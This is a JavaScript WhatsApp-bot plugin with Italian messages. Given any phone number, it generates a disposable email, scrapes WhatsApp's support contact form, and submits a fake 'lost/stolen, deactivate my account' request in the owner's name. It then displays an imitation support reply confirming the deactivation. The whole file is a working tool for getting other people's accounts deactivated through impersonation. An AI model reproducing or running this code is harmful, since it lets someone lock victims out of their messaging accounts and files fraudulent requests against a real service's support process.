import * as cheerio from 'cheerio'
import axios from 'axios'
import util from 'util'

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
    const q = args.join(" ")    
    if (!q || !args[0]) return m.reply('*[❗] Inserisci il numero che desideri disattivare in formato internazionale, esempio: +1 (450) 555-555*')

    let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
    let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
    let cookie = ntah.headers["set-cookie"].join("; ")
    let $ = cheerio.load(ntah.data)
    let $form = $("form");
    let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
    let form = new URLSearchParams()
    form.append("jazoest", $form.find("input[name=jazoest]").val())
    form.append("lsd", $form.find("input[name=lsd]").val())
    form.append("step", "submit")
    form.append("country_selector", "ID")
    form.append("phone_number", q)
    form.append("email", email.data[0])
    form.append("email_confirm", email.data[0])
    form.append("platform", "ANDROID")
    form.append("your_message", "Perso/rubato: disattiva il mio account: " + q)
    form.append("__user", "0")
    form.append("__a", "1")
    form.append("__csr", "")
    form.append("__req", "8")
    form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
    form.append("dpr", "1")
    form.append("__ccg", "UNKNOWN")
    form.append("__rev", "1006630858")
    form.append("__comment_req", "0")

    let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
    var payload = String(res.data)

    if (payload.includes(`"payload":true`)) {
        m.reply(`##- Supporto WhatsApp -##\n\nCiao,\n\nGrazie per il tuo messaggio.\n\nAbbiamo disattivato il tuo account WhatsApp. Questo significa che il tuo account è temporaneamente disabilitato e verrà eliminato automaticamente entro 30 giorni se non lo registri nuovamente. Nota: il team di supporto di WhatsApp non può eliminare manualmente il tuo account.\n\nDurante il periodo di disattivazione:\n • I tuoi contatti su WhatsApp potrebbero ancora vedere il tuo nome e la tua foto del profilo.\n • Qualsiasi messaggio inviato dai tuoi contatti rimarrà in stato di attesa per un massimo di 30 giorni.\n\nSe desideri recuperare il tuo account, registralo nuovamente il prima possibile inserendo il codice a 6 cifre ricevuto via SMS o chiamata telefonica.\n\nSe hai altre domande o dubbi, non esitare a contattarci. Saremo felici di aiutarti!`)
    } else if (payload.includes(`"payload":false`)) {
        m.reply(`##- Supporto WhatsApp -##\n\nCiao:\n\nGrazie per il tuo messaggio.\n\nPer procedere con la tua richiesta, abbiamo bisogno che tu verifichi che questo numero di telefono ti appartiene. Ti preghiamo di inviarci documentazione che ci consenta di verificare che il numero è di tua proprietà, come una copia della fattura telefonica o del contratto di servizio.\n\nAssicurati di inserire il tuo numero di telefono in formato internazionale completo. Per ulteriori informazioni sul formato internazionale, consulta questo articolo.\n\nSe hai altre domande o dubbi, non esitare a contattarci. Saremo felici di aiutarti.`)
    } else {
        m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
    }
}

handler.command = /^(supportwa|support)$/i
handler.rowner = true 
export default handler